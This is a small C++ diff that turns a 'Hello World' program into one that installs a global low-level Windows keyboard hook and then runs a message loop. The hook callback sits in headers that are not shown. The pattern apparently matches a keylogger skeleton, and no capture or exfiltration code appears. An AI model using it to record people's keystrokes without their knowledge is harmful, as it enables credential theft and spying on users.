@@ -2,8 +2,15 @@
 //
 
 #include <iostream>
+#include "hook.h"
+#include "utils.h"
 
-int main()
-{
-    std::cout << "Hello World!\n";
+extern HHOOK hHook;
+
+int main() {
+	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, NULL, 0);
+	if (hHook == NULL) {
+		return -1;
+	}
+	while (GetMessage(NULL, NULL, 0, 0));
 }
